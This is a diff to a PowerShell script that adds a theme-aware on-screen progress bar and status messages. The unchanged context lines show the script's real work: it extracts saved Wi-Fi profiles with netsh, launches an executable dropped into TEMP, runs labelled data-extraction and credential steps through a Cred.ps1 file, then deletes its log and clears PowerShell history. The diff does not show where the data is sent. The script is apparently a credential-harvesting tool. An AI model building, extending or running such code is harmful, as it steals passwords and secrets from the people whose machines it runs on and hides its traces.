@@ -13,24 +13,103 @@ $null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append
 # Load the WPF assembly
 Add-Type -AssemblyName PresentationFramework
 
-# Create a new WPF window
-$window = New-Object System.Windows.Window
-$window.Title = "Progress"
-$window.Width = 300
-$window.Height = 100
-$window.Topmost = $true # Keep it on top
+# Detect if the system theme is dark or light by reading registry value
+$themeKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"
+$themeValue = Get-ItemProperty -Path $themeKeyPath -Name "AppsUseLightTheme" -ErrorAction SilentlyContinue
 
-# Create a ProgressBar
+# Default to Light theme if the registry key does not exist
+$isDarkTheme = ($themeValue.AppsUseLightTheme -eq 0)
+
+# Create a new WPF Window
+$window = New-Object System.Windows.Window
+$window.Title = "Custom Progress Bar"
+$window.Width = 400
+$window.Height = 30
+$window.WindowStartupLocation = "Manual"
+$window.Topmost = $true  # Keep on top of other windows
+
+# Make the window transparent
+$window.AllowsTransparency = $true
+$window.WindowStyle = [System.Windows.WindowStyle]::None
+$window.Background = [System.Windows.Media.Brushes]::Transparent
+
+# Calculate screen and taskbar dimensions
+$screenHeight = [System.Windows.SystemParameters]::PrimaryScreenHeight
+$screenWidth = [System.Windows.SystemParameters]::PrimaryScreenWidth
+$taskbarHeight = $screenHeight - [System.Windows.SystemParameters]::WorkArea.Height
+
+# Position the window above the taskbar
+$window.Left = 0
+$window.Top = $screenHeight - $taskbarHeight - $window.Height
+$window.Width = $screenWidth
+
+# Create a Grid to hold the UI elements
+$grid = New-Object System.Windows.Controls.Grid
+
+# Define ProgressBar style
 $progressBar = New-Object System.Windows.Controls.ProgressBar
-$progressBar.IsIndeterminate = $false
+$progressBar.Minimum = 0
 $progressBar.Maximum = 100
 $progressBar.Value = 0
-$progressBar.Width = 250
-$progressBar.Height = 30
-$progressBar.Margin = New-Object System.Windows.Thickness(10)
+$progressBar.Height = 20
+$progressBar.Width = 300
+$progressBar.HorizontalAlignment = 'Right'  # Align to the left
+$progressBar.Margin = [System.Windows.Thickness]::new(0,0,10,10)  # Adjust left margin as needed
 
-# Add ProgressBar to the Window
-$window.Content = $progressBar
+# Set ProgressBar color based on the system theme
+if ($isDarkTheme) {
+    # Dark theme colors
+    $gradientBrush = New-Object System.Windows.Media.LinearGradientBrush
+    $gradientBrush.StartPoint = [System.Windows.Point]::Parse("0,0")
+    $gradientBrush.EndPoint = [System.Windows.Point]::Parse("1,0")
+    $gradientStop1 = New-Object System.Windows.Media.GradientStop
+    $gradientStop1.Color = [System.Windows.Media.Colors]::DarkGray
+    $gradientStop1.Offset = 0.0
+    $gradientBrush.GradientStops.Add($gradientStop1)
+
+    $gradientStop2 = New-Object System.Windows.Media.GradientStop
+    $gradientStop2.Color = [System.Windows.Media.Colors]::Gray
+    $gradientStop2.Offset = 1.0
+    $gradientBrush.GradientStops.Add($gradientStop2)
+
+    $progressBar.Foreground = $gradientBrush
+} else {
+    # Light theme colors
+    $gradientBrush = New-Object System.Windows.Media.LinearGradientBrush
+    $gradientBrush.StartPoint = [System.Windows.Point]::Parse("0,0")
+    $gradientBrush.EndPoint = [System.Windows.Point]::Parse("1,0")
+    $gradientStop1 = New-Object System.Windows.Media.GradientStop
+    $gradientStop1.Color = [System.Windows.Media.Colors]::LightGreen
+    $gradientStop1.Offset = 0.0
+    $gradientBrush.GradientStops.Add($gradientStop1)
+
+    $gradientStop2 = New-Object System.Windows.Media.GradientStop
+    $gradientStop2.Color = [System.Windows.Media.Colors]::Green
+    $gradientStop2.Offset = 1.0
+    $gradientBrush.GradientStops.Add($gradientStop2)
+
+    $progressBar.Foreground = $gradientBrush
+}
+
+# Set the background color of the ProgressBar
+$progressBar.Background = [System.Windows.Media.Brushes]::LightGray
+
+# Add ProgressBar to the Grid
+$grid.Children.Add($progressBar)
+
+# Create a TextBlock for the completion notification
+$textBlock = New-Object System.Windows.Controls.TextBlock
+$textBlock.Text = "Starting operations..."
+$textBlock.HorizontalAlignment = 'Right'
+$textBlock.Margin = [System.Windows.Thickness]::new(0, 0, 10, 10)
+$textBlock.FontSize = 12
+$textBlock.Foreground = [System.Windows.Media.Brushes]::White
+
+# Add TextBlock to the Grid
+$grid.Children.Add($textBlock)
+
+# Set the Grid as the Content of the Window
+$window.Content = $grid
 
 # Show the window
 $window.Show()
@@ -44,6 +123,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     switch ($step) {
         1 {
             # Operation 1 - Extract Wi-Fi profiles
+            $textBlock.Text = "Starting Operation 1..."
             try {
                 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
                     $wlan = $_.Matches.Value
@@ -76,7 +156,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                 Add-Type -AssemblyName PresentationFramework
                 [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
             }
-
+            $textBlock.Text = "Extracted!"
+            $textBlock.Text = "Starting operation 2..."
             # Write-Output "Completed Operation 1 - NETSH"
         }
         2 {
@@ -104,6 +185,9 @@ for ($step = 1; $step -le $totalSteps; $step++) {
 
             $process = Start-Process $tempExePath # Start the executable
 
+            $textBlock.Text = "Done operation 2!"
+            $textBlock.Text = "Starting operation 3..."
+
             # Write-Output "Completed Operation 2"
         }
         3 {
@@ -127,6 +211,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             Start-Sleep -Seconds 2 # Wait a moment for the file to save
             Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
+            $textBlock.Text = "Done operation 3"
+            $textBlock.Text = "Starting operation 4..."
             # Write-Output "Completed Operation 3 - EXTRACT DATA"
         }
         4 {
@@ -175,6 +261,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
             Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
 
+            $textBlock.Text = "Done operation 4..."
+            $textBlock.Text = "Starting last operation ..."
             # Write-Output "Completed Operation 4 - CRED done"
         }
         5 {
@@ -292,6 +380,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     
             # Clear the PowerShell command history
             Clear-History
+
+            $textBlock.Text = "Done Last operation."
     
             # Display a message box indicating completion
             # Add-Type -AssemblyName PresentationFramework
@@ -316,4 +406,4 @@ Stop-Transcript
 # Write-Output "All operations completed!"
 # Display a message box indicating completion
 Add-Type -AssemblyName PresentationFramework
-[System.Windows.MessageBox]::Show('All operations completed!', 'Notification')
+[System.Windows.MessageBox]::Show("All operations completed!", "Success", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
